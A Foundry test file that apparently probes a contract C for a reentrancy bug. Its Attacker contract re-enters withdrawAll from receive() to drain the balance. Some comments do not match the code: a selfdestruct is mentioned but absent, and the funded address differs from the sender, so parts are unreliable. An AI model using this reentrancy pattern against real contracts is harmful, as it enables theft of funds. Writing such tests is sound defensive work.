pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {C} from "../src/C_under_test.sol";

contract InvMutTest is Test {
    C c;
    function setUp() public { c = new C(); }
    function testRegression_property() public {
        // Deploy a malicious receiver that selfdestructs after re-entering withdrawAll
        address attacker = address(new Attacker(c));
        // Fund attacker and non-owner
        vm.deal(address(this), 1 ether);
        vm.deal(attacker, 1 ether);
        // Non-owner sends 1 ether to contract via fallback
        vm.prank(address(0xdead));
        (bool ok1,) = address(c).call{value: 1 ether}("");
        assertTrue(ok1);
        // Owner calls sendMoney to attacker; attacker re-enters withdrawAll
        vm.prank(c.owner());
        // For reference, transfer in withdrawAll reverts due to limited gas (2300) and reentrant call to sendMoney;
        // buggy contract forwards all gas, so attacker can re-enter withdrawAll and drain all funds.
        (bool ok2,) = address(c).call(abi.encodeWithSignature("sendMoney(address,uint256)", attacker, 1 ether));
        // After this call, reference contract reverts (ok2 false), buggy succeeds (ok2 true) 
        // and attacker's balance becomes 2 ether (1 + 1)
        assertTrue(attacker.balance == 2 ether);
    }
}

contract Attacker {
    C c;
    constructor(C _c) { c = _c; }
    receive() external payable {
        if (address(c).balance >= 1 ether) {
            c.withdrawAll();
        }
    }
}

